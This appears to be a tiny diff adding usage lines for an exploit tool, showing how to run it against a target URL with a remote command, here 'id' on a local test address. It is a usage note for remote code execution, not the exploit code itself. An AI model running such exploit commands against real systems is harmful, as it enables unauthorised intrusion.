@@ -1,0 +1,2 @@
+# -u (target url) -c (command RCE)
+yan exploit -u http://127.0.0.1:8105/ -c "id"
